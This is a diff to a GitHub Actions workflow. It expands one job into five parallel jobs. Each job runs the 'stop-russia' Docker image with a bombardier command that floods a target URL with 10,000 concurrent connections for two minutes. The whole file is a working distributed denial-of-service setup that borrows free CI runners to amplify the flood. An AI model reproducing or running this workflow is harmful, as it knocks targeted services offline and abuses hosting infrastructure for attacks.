@@ -10,11 +10,53 @@ on:
       - main
 
 jobs:
-  run-docker-command:
+  run-docker-command-1:
     runs-on: ubuntu-latest
 
     steps:
-      - name: Checkout repository
+      - name: Instance 1
+        uses: actions/checkout@v3
+
+      - name: Run Docker command
+        uses: addnab/docker-run-action@v3
+        with:
+            image: abagayev/stop-russia:latest
+            run: | 
+                  bombardier -c 10000 -d 120s -l $URL
+
+  run-docker-command-2:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Instance 2
+        uses: actions/checkout@v3
+
+      - name: Run Docker command
+        uses: addnab/docker-run-action@v3
+        with:
+            image: abagayev/stop-russia:latest
+            run: | 
+                  bombardier -c 10000 -d 120s -l $URL
+
+  run-docker-command-3:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Instance 3
+        uses: actions/checkout@v3
+
+      - name: Run Docker command
+        uses: addnab/docker-run-action@v3
+        with:
+            image: abagayev/stop-russia:latest
+            run: | 
+                  bombardier -c 10000 -d 120s -l $URL
+
+  run-docker-command-4:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Instance 4
         uses: actions/checkout@v3
 
       - name: Run Docker command
@@ -24,4 +66,16 @@ jobs:
             run: | 
                   bombardier -c 10000 -d 120s -l $URL
   
+  run-docker-command-5:
+    runs-on: ubuntu-latest
 
+    steps:
+      - name: Instance 5
+        uses: actions/checkout@v3
+
+      - name: Run Docker command
+        uses: addnab/docker-run-action@v3
+        with:
+            image: abagayev/stop-russia:latest
+            run: | 
+                  bombardier -c 10000 -d 120s -l $URL
